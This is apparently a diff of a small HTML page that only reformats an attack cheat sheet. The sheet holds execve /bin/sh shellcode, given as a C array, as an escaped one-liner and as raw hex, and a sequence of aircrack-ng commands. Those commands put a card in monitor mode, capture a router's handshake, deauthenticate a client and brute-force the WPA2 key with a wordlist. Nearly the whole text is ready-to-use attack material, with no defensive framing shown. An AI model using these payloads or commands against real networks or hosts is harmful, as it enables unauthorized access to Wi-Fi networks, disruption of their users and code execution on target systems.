@@ -10,43 +10,43 @@
   </head>
 
   <body>
-  <code>
-    # Shell storm
-    char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
-                      "\x68\x68\x2f\x62\x69\x6e\x89"
-                      "\xe3\x89\xc1\x89\xc2\xb0\x0b"
-                      "\xcd\x80\x31\xc0\x40\xcd\x80";
+    <pre>
+# Shell storm
+char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
+                  "\x68\x68\x2f\x62\x69\x6e\x89"
+                  "\xe3\x89\xc1\x89\xc2\xb0\x0b"
+                  "\xcd\x80\x31\xc0\x40\xcd\x80";
 
 
-    # Shell storm one-liner
-    \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
-
-
-
-    # Shell storm min-escape
-    31c050682f2f73
-    68682f62696e89
-    e389c189c2b00b
-    cd8031c040cd80
+# Shell storm one-liner
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
 
 
 
-    # Aircrack-ng
-    ifconfig
-    airmon-ng start [interface]
-
-    airodump-ng [interface]
-    airodump-ng -c [channel] --bssid [bssid] -w /root/Desktop/ [monitor interface]
-
-
-    # Deauth Attack
-    aireplay-ng –0 2 –a [router bssid] –c [client bssid] mon0
+# Shell storm min-escape
+31c050682f2f73
+68682f62696e89
+e389c189c2b00b
+cd8031c040cd80
 
 
-    # Aircrack Bruteforce
-    aircrack-ng -a2 -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap
-  </code>
+
+# Aircrack-ng
+ifconfig
+airmon-ng start [interface]
+
+airodump-ng [interface]
+airodump-ng -c [channel] --bssid [bssid] -w /root/Desktop/ [monitor interface]
+
+
+# Deauth Attack
+aireplay-ng –0 2 –a [router bssid] –c [client bssid] mon0
+
+
+# Aircrack Bruteforce
+aircrack-ng -a2 -b [router bssid] -w [path to wordlist] /root/Desktop/*.cap
+
+    </pre>
   </body>
 
 </html>
-
